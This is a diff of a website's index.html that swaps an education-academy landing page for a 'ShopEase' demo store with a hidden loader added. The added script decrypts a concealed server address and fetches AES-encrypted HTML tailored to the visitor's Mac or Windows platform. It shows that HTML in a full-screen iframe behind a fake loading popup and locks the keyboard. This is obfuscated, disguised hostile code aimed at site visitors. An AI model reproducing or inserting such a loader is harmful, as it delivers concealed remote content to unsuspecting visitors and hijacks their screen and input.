@@ -1,643 +1,312 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SmartCourseInk | Digital Pedagogy, Cognitive Architecture & Executive Mastery</title>
-  <meta name="description" content="Discover SmartCourseInk: The premier academy for accelerated cognitive learning, spaced retrieval architecture, and executive curriculum engineering.">
-  <meta name="keywords" content="digital pedagogy, cognitive learning, course architecture, spaced repetition, curriculum engineering, deep work, executive education">
-  <link rel="canonical" href="https://smartcourseink.com/">
-  
-  <!-- Fonts & Icons -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,500;0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  
-  <link rel="stylesheet" href="css/style.css">
-  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-TD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-  gtag('config', 'G-0LY0HY7L01');
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
 </script>
+
+
 </head>
 <body>
 
-<header class="site-header">
-  <div class="container header-inner">
-    <a href="index.html" class="brand-logo">
-      <div class="brand-title">Smart<span>Course</span>Ink</div>
-      <div class="brand-subtitle">Digital Pedagogy & Cognitive Mastery</div>
-    </a>
-    
-    <nav>
-      <ul class="nav-links">
-        <li><a href="index.html" class="nav-link active">Home</a></li>
-        <li><a href="about.html" class="nav-link ">The Academy</a></li>
-        <li><a href="blog.html" class="nav-link ">Monographs</a></li>
-        <li><a href="contact.html" class="nav-link ">Admissions</a></li>
-      </ul>
-    </nav>
-    
-    <div class="header-cta">
-      <a href="contact.html" class="btn btn-blue"><i class="fas fa-graduation-cap"></i> Enroll Now</a>
-      <button class="mobile-toggle" aria-label="Toggle Navigation">
-        <i class="fas fa-bars"></i>
-      </button>
-    </div>
-  </div>
-</header>
-
-<!-- SECTION 1: HERO SHOWCASE -->
-<section class="hero-section">
-  <div class="container">
-    <div class="hero-grid">
-      <div class="hero-content">
-        <span class="section-tag"><i class="fas fa-brain"></i> The 2026 Academic Cohort</span>
-        <h1>Where Cognitive Science Meets Curriculum Engineering</h1>
-        <p class="hero-lead">SmartCourseInk transforms adult learning through evidence-based cognitive architectures, active recall frameworks, and rigorous first-principles syllabi.</p>
-        <div class="hero-cta-group">
-          <a href="#curriculum-architect" class="btn btn-blue"><i class="fas fa-sitemap"></i> Explore Curriculum Paths</a>
-          <a href="#pedagogy-matrix" class="btn btn-outline"><i class="fas fa-chart-line"></i> View Cognitive Science</a>
-        </div>
-        <div class="hero-stats-row">
-          <div class="stat-item">
-            <h3>98.4%</h3>
-            <p>Syllabus Completion Rate</p>
-          </div>
-          <div class="stat-item">
-            <h3>4.8x</h3>
-            <p>Knowledge Retention vs. Lecture</p>
-          </div>
-          <div class="stat-item">
-            <h3>45+</h3>
-            <p>Accredited Faculty Fellows</p>
-          </div>
-        </div>
-      </div>
-      
-      <div class="hero-image-card">
-        <div class="hero-image-wrapper">
-          <img src="images/edu-hero-students.jpg" alt="Scholars Collaborating in Digital Academic Library" loading="eager">
-        </div>
-        <div class="hero-badge-float">
-          <h4>Spaced Retrieval System</h4>
-          <p>SuperMemo SM-2 algorithms reinforcing long-term memory traces.</p>
-        </div>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
   </div>
-</section>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-<!-- SECTION 2: COGNITIVE PEDAGOGY PILLARS -->
-<section class="section section-slate" id="pillars">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Pedagogical Framework</span>
-      <h2 class="section-title">The Three Pillars of Cognitive Mastery</h2>
-      <p class="section-subtitle">Our curriculum engineering replaces passive rote memorization with active neural consolidation mechanisms.</p>
-    </div>
-    
-    <div class="pillars-grid">
-      <div class="pillar-card">
-        <div class="pillar-icon"><i class="fas fa-layer-group"></i></div>
-        <h3>Cognitive Load Optimization</h3>
-        <p>Structuring complex domain concepts into modular schemas, minimizing extraneous load and maximizing germane neural encoding.</p>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
       </div>
-      
-      <div class="pillar-card">
-        <div class="pillar-icon"><i class="fas fa-history"></i></div>
-        <h3>Active Spaced Retrieval</h3>
-        <p>Interleaving recall challenges across expanding mathematical intervals to transform short-term memory traces into permanent synaptic pathways.</p>
-      </div>
-      
-      <div class="pillar-card">
-        <div class="pillar-icon"><i class="fas fa-project-diagram"></i></div>
-        <h3>First-Principles Synthesis</h3>
-        <p>Deconstructing complex multi-layered disciplines down to foundational axioms before building high-order problem-solving models.</p>
-      </div>
-    </div>
-  </div>
-</section>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
 
-<!-- SECTION 3: INTERACTIVE COGNITIVE SKILL & CURRICULUM ARCHITECT -->
-<section class="section" id="curriculum-architect">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Interactive Syllabus</span>
-      <h2 class="section-title">The Curriculum Syllabus Architect</h2>
-      <p class="section-subtitle">Select your academic domain focus and preferred learning pace to generate an individualized modular course pathway.</p>
-    </div>
-    
-    <div class="architect-panel">
-      <div class="architect-controls">
-        <div class="control-group">
-          <label for="curriculum-domain"><i class="fas fa-book-reader"></i> Select Academic Domain</label>
-          <select id="curriculum-domain" class="control-select">
-            <option value="ai-systems">Applied Neural Systems & Data Engineering</option>
-            <option value="quantitative">Advanced Mathematical Logic & Stochastic Modeling</option>
-            <option value="linguistics">Computational Linguistics & Cognitive Semantics</option>
-          </select>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
+
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
+
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1+ZV4B4shIyEYopUetzDlM8rBCY07decV0ugFl6IZehLUPZK3pNzYk+";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
         
-        <div class="control-group">
-          <label for="curriculum-pace"><i class="fas fa-tachometer-alt"></i> Select Learning Cohort Pace</label>
-          <select id="curriculum-pace" class="control-select">
-            <option value="intensive">Intensive Mastery Cohort (12 Weeks &bull; Deep Immersive)</option>
-            <option value="executive">Executive Strategy Track (6 Weeks &bull; High-Yield Synthesis)</option>
-          </select>
-        </div>
-      </div>
-      
-      <div class="architect-result-box">
-        <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-subtle); padding-bottom: 1rem; margin-bottom: 1rem;">
-          <div>
-            <span style="font-size: 0.78rem; text-transform: uppercase; letter-spacing: 0.15em; color: var(--primary-blue); font-weight: 700;">Engineered Syllabus</span>
-            <h3 id="curriculum-path-title" style="font-size: 1.5rem; margin-top: 0.2rem;">Applied Neural Systems & Data Engineering Track</h3>
-          </div>
-          <span style="background: var(--primary-ink); color: #fff; padding: 0.4rem 0.8rem; border-radius: 4px; font-size: 0.8rem; font-weight: 700;"><i class="fas fa-award" style="color: var(--accent-amber);"></i> Micro-Credential Accredited</span>
-        </div>
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
         
-        <p id="curriculum-path-desc" style="font-size: 0.95rem; color: var(--text-secondary); margin-bottom: 1.5rem;">Deep structural immersion into computational linear algebra, transformer architectures, and production model orchestration.</p>
-        
-        <div id="modules-display" class="modules-grid">
-          <!-- Dynamically Populated by JavaScript -->
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+       
+        secureKeyboardAccess();
 
-<!-- SECTION 4: COGNITIVE SCIENCE & RETENTION MATRIX -->
-<section class="section section-slate" id="pedagogy-matrix">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Empirical Science</span>
-      <h2 class="section-title">Cognitive Learning Science & Retention Matrix</h2>
-      <p class="section-subtitle">Comparing traditional passive lecture models against active cognitive architectures across retention and synaptic encoding metrics.</p>
-    </div>
-    
-    <div class="table-responsive">
-      <table class="pedagogy-table">
-        <thead>
-          <tr>
-            <th>Learning Methodology</th>
-            <th>Cognitive Mechanism</th>
-            <th>30-Day Retention Rate</th>
-            <th>Working Memory Load</th>
-            <th>Transfer to Novel Problems</th>
-            <th>Synaptic Consolidation</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td><span class="pedagogy-badge badge-recall">Active Retrieval Practice</span></td>
-            <td>Synaptic Re-Consolidation & Testing Effect</td>
-            <td>84% (High Durability)</td>
-            <td>Optimized Germane Load</td>
-            <td>Superior Generalization</td>
-            <td>Strong LTP Potentiation</td>
-          </tr>
-          <tr>
-            <td><span class="pedagogy-badge badge-spaced">Spaced Leitner Algorithms</span></td>
-            <td>Ebbinghaus Forgetting Curve Interception</td>
-            <td>91% (Long-Term Mastery)</td>
-            <td>Low Extraneous Friction</td>
-            <td>Robust Recall Under Stress</td>
-            <td>Permanent Long-Term Storage</td>
-          </tr>
-          <tr>
-            <td><span class="pedagogy-badge badge-feynman">Feynman Socratic Dialectic</span></td>
-            <td>Dual-Coding & Conceptual Simplification</td>
-            <td>88% (Deep Understanding)</td>
-            <td>High Active Synthesis</td>
-            <td>Mastery in Cross-Disciplinary Fields</td>
-            <td>Dense Semantic Neural Maps</td>
-          </tr>
-        </tbody>
-      </table>
-    </div>
-  </div>
-</section>
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
 
-<!-- SECTION 5: BLOOM'S COGNITIVE TAXONOMY LADDER -->
-<section class="section" id="taxonomy-ladder">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Mastery Progression</span>
-      <h2 class="section-title">Bloom's Cognitive Taxonomy Ladder</h2>
-      <p class="section-subtitle">How our course architectures systematically escalate cognitive processing from factual recall to original synthesis.</p>
-    </div>
-    
-    <div class="bloom-grid">
-      <div class="bloom-card">
-        <div style="font-size: 1.8rem; color: var(--primary-blue); margin-bottom: 0.8rem;"><i class="fas fa-brain"></i></div>
-        <h3>1. Foundational Recall</h3>
-        <p>Acquiring precision terminology, structural definitions, and mathematical axioms via spaced repetition micro-quizzes.</p>
-      </div>
-      
-      <div class="bloom-card">
-        <div style="font-size: 1.8rem; color: var(--primary-blue); margin-bottom: 0.8rem;"><i class="fas fa-compress-arrows-alt"></i></div>
-        <h3>2. Structural Comprehension</h3>
-        <p>Translating abstract theories into personal mental models through dual-coding visual mapping and self-explanation.</p>
-      </div>
-      
-      <div class="bloom-card">
-        <div style="font-size: 1.8rem; color: var(--primary-blue); margin-bottom: 0.8rem;"><i class="fas fa-tools"></i></div>
-        <h3>3. Sandboxed Application</h3>
-        <p>Executing live code, solving first-principles problem sets, and deriving theoretical proofs in sandboxed digital labs.</p>
-      </div>
-      
-      <div class="bloom-card">
-        <div style="font-size: 1.8rem; color: var(--primary-blue); margin-bottom: 0.8rem;"><i class="fas fa-search-plus"></i></div>
-        <h3>4. Critical Analysis</h3>
-        <p>Dissecting complex case studies, identifying edge cases, and auditing systemic assumptions in real-world environments.</p>
-      </div>
-      
-      <div class="bloom-card">
-        <div style="font-size: 1.8rem; color: var(--primary-blue); margin-bottom: 0.8rem;"><i class="fas fa-balance-scale"></i></div>
-        <h3>5. Evaluative Judgement</h3>
-        <p>Defending technical design decisions, conducting rigorous peer reviews, and evaluating trade-offs in resource-constrained scenarios.</p>
-      </div>
-      
-      <div class="bloom-card">
-        <div style="font-size: 1.8rem; color: var(--primary-blue); margin-bottom: 0.8rem;"><i class="fas fa-drafting-compass"></i></div>
-        <h3>6. Creative Synthesis</h3>
-        <p>Authoring original capstone architectures, developing novel research algorithms, and publishing peer-reviewed project dissertations.</p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- SECTION 6: FOUR-STEP LEARNING ARCHITECTURE -->
-<section class="section section-dark" id="learning-protocol">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Learning Protocol</span>
-      <h2 class="section-title">The 4-Step Cognitive Architecture</h2>
-      <p class="section-subtitle">How adult scholars advance through our structured pedagogical sequence to achieve permanent skill retention.</p>
-    </div>
-    
-    <div class="protocol-timeline">
-      <div class="protocol-card">
-        <div class="protocol-num">1</div>
-        <h3 style="color: #fff; font-size: 1.25rem; margin-bottom: 0.6rem;">Diagnostic Calibration</h3>
-        <p style="font-size: 0.9rem; color: #94a3b8;">Adaptive baseline assessment identifying cognitive prerequisite gaps and formulating your custom curriculum path.</p>
-      </div>
-      
-      <div class="protocol-card">
-        <div class="protocol-num">2</div>
-        <h3 style="color: #fff; font-size: 1.25rem; margin-bottom: 0.6rem;">Micro-Modular Delivery</h3>
-        <p style="font-size: 0.9rem; color: #94a3b8;">High-density 15-minute conceptual modules engineered strictly within working memory capacity limits.</p>
-      </div>
-      
-      <div class="protocol-card">
-        <div class="protocol-num">3</div>
-        <h3 style="color: #fff; font-size: 1.25rem; margin-bottom: 0.6rem;">Interleaved Problem Sets</h3>
-        <p style="font-size: 0.9rem; color: #94a3b8;">Mixing related problem types to train neurological discrimination and prevent superficial pattern matching.</p>
-      </div>
-      
-      <div class="protocol-card">
-        <div class="protocol-num">4</div>
-        <h3 style="color: #fff; font-size: 1.25rem; margin-bottom: 0.6rem;">Socratic Defense</h3>
-        <p style="font-size: 0.9rem; color: #94a3b8;">Live capstone defense in peer colloquium pods led by senior faculty fellows and industry practitioners.</p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- SECTION 7: CURRICULUM SHOWCASE GALLERY -->
-<section class="section" id="curriculum-gallery">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Visual Academy</span>
-      <h2 class="section-title">Curriculum Showcase & Academic Environments</h2>
-      <p class="section-subtitle">Explore our state-of-the-art virtual lecture theaters, collaborative research labs, and academic library stacks.</p>
-    </div>
-    
-    <div class="gallery-grid">
-      <div class="gallery-card">
-        <div class="gallery-media">
-          <img src="images/edu-lecture-hall.jpg" alt="University Lecture Hall with Professor Presenting" loading="lazy">
-        </div>
-        <div class="gallery-info">
-          <span class="gallery-tag">Lecture Hall</span>
-          <h3>Interactive Socratic Theaters</h3>
-          <p style="font-size: 0.88rem; color: var(--text-muted);">Real-time faculty discussions and live whiteboard derivations delivered in ultra-low latency digital auditoriums.</p>
-        </div>
-      </div>
-      
-      <div class="gallery-card">
-        <div class="gallery-media">
-          <img src="images/edu-digital-learning.jpg" alt="Digital Learning Course Interface on Laptop" loading="lazy">
-        </div>
-        <div class="gallery-info">
-          <span class="gallery-tag">Digital Platform</span>
-          <h3>Spaced Retrieval Dashboard</h3>
-          <p style="font-size: 0.88rem; color: var(--text-muted);">Algorithmic recall scheduling, automated knowledge gap detection, and interactive coding sandboxes.</p>
-        </div>
-      </div>
-      
-      <div class="gallery-card">
-        <div class="gallery-media">
-          <img src="images/edu-library-research.jpg" alt="Academic Library Stacks and Research Desks" loading="lazy">
-        </div>
-        <div class="gallery-info">
-          <span class="gallery-tag">Research Archives</span>
-          <h3>Curated Monograph Library</h3>
-          <p style="font-size: 0.88rem; color: var(--text-muted);">Access to over 10,000 peer-reviewed academic papers, proprietary case studies, and faculty lecture transcripts.</p>
-        </div>
-      </div>
-      
-      <div class="gallery-card">
-        <div class="gallery-media">
-          <img src="images/edu-stem-laboratory.jpg" alt="Scientific Research Laboratory Glassware" loading="lazy">
-        </div>
-        <div class="gallery-info">
-          <span class="gallery-tag">Applied STEM</span>
-          <h3>Computational Research Labs</h3>
-          <p style="font-size: 0.88rem; color: var(--text-muted);">Cloud-hosted GPU clusters and virtual simulation environments for machine intelligence and data modeling.</p>
-        </div>
-      </div>
-      
-      <div class="gallery-card">
-        <div class="gallery-media">
-          <img src="images/edu-collaborative-workshop.jpg" alt="Collaborative Academic Workshop Wireframing" loading="lazy">
-        </div>
-        <div class="gallery-info">
-          <span class="gallery-tag">Cohort Synergy</span>
-          <h3>Peer Colloquium Pods</h3>
-          <p style="font-size: 0.88rem; color: var(--text-muted);">Small-group peer review circles facilitating intense intellectual debate, thesis defense, and project critique.</p>
-        </div>
-      </div>
-      
-      <div class="gallery-card">
-        <div class="gallery-media">
-          <img src="images/edu-data-science-coding.jpg" alt="Data Science Algorithm Code on Screen" loading="lazy">
-        </div>
-        <div class="gallery-info">
-          <span class="gallery-tag">Algorithm Guild</span>
-          <h3>Production Engineering Labs</h3>
-          <p style="font-size: 0.88rem; color: var(--text-muted);">Hands-on implementation of distributed neural pipelines, vector indices, and cryptographic algorithms.</p>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- SECTION 8: OPEN PEDAGOGICAL MANIFESTO -->
-<section class="section section-dark" id="manifesto">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Academic Creed</span>
-      <h2 class="section-title">The SmartCourseInk Pedagogical Manifesto</h2>
-      <p class="section-subtitle">Rejecting superficial diploma mills in favor of profound intellectual mastery, cognitive transparency, and peer accountability.</p>
-    </div>
-    
-    <div class="manifesto-pillars">
-      <div class="manifesto-box">
-        <div style="font-size: 2rem; color: var(--accent-amber); margin-bottom: 1rem;"><i class="fas fa-check-double"></i></div>
-        <h3>Zero-Rote Architecture</h3>
-        <p>We eliminate passive video watching. Every learning module requires active cognitive output, mandatory derivation exercises, and algorithmic retrieval checkpoints.</p>
-      </div>
-      
-      <div class="manifesto-box">
-        <div style="font-size: 2rem; color: var(--accent-amber); margin-bottom: 1rem;"><i class="fas fa-certificate"></i></div>
-        <h3>Verifiable Competency Proofs</h3>
-        <p>Our micro-credentials represent cryptographically signed proof-of-competency derived from rigorous peer-reviewed capstone projects rather than mere attendance.</p>
-      </div>
-      
-      <div class="manifesto-box">
-        <div style="font-size: 2rem; color: var(--accent-amber); margin-bottom: 1rem;"><i class="fas fa-users-cog"></i></div>
-        <h3>Faculty Fellow Mentorship</h3>
-        <p>Scholars engage directly in weekly live Socratic office hours with seasoned academic researchers and practicing industry leaders.</p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- SECTION 9: STUDY METHOD & FOCUS HARMONIZER -->
-<section class="section section-slate" id="study-harmonizer">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Metacognition</span>
-      <h2 class="section-title">Study Method & Focus Harmonizer</h2>
-      <p class="section-subtitle">Discover the optimal cognitive retrieval techniques and dual-coding frameworks tailored to your primary learning modality.</p>
-    </div>
-    
-    <div class="harmonizer-card">
-      <div class="control-group" style="max-width: 420px; margin: 0 auto 2rem;">
-        <label for="harmonizer-modality" style="text-align: center;"><i class="fas fa-user-graduate"></i> Select Primary Modality</label>
-        <select id="harmonizer-modality" class="control-select">
-          <option value="visual">Visual-Spatial & Structural Modeling</option>
-          <option value="verbal">Verbal-Linguistic & Socratic Dialectic</option>
-          <option value="kinesthetic">Kinesthetic-Logic & First-Principles Problem Sets</option>
-        </select>
-      </div>
-      
